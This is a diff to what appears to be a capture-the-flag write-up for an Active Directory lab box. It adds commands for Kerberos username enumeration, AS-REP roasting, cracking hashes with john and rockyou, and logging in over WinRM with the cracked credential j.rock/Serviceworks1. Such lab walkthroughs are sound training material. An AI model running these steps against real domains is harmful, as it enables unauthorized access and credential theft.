@@ -55,6 +55,12 @@ Add domain address and ip address to the known hosts
 # lets try to enumerate using the given names
 <img width="1244" height="498" alt="image" src="https://github.com/user-attachments/assets/6b682ff3-b16f-4f40-8cfa-06c052f62ada" />
 
+```
+git clone https://github.com/mohinparamasivam/AD-Username-Generator
+```
+This is the tool we will use to generate username
+
+
 <img width="911" height="217" alt="image" src="https://github.com/user-attachments/assets/cebcaff7-433b-42bc-87fc-9466d9af8ad3" />
 
 
@@ -66,16 +72,21 @@ kerbrute userenum generated_username.txt --dc $target -d services.local
 
 <img width="560" height="273" alt="image" src="https://github.com/user-attachments/assets/73ec6a55-d49c-4e67-9da1-4d47b8fb2950" />
 
+# asreproasting
 ```
 impacket-GetNPUsers services.local/ -dc-ip $target -u valid_usernames.txt -outputfile hashes.txt
 ```
 <img width="921" height="214" alt="image" src="https://github.com/user-attachments/assets/92d3082f-9bd3-4e3f-aa2b-351eea0476be" />
 
+# crack the hash
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 ```
 <img width="921" height="208" alt="image" src="https://github.com/user-attachments/assets/d3f74597-9116-462a-8dee-3e8823cb11c0" />
 
+# Gain user shell
+
+Lets check the credentials in the winrm
 ```
 crackmapexec winrm $target -u j.rock -p Serviceworks1
 ```
@@ -91,6 +102,7 @@ evil-winrm -u j.rock -p Serviceworks1 -i $target
 <img width="718" height="270" alt="image" src="https://github.com/user-attachments/assets/23b2bd4a-9a4d-41fa-bb95-ce41fc476e30" />
 
 
+# Privilege escalation
 ```
 whoami /all
 ```
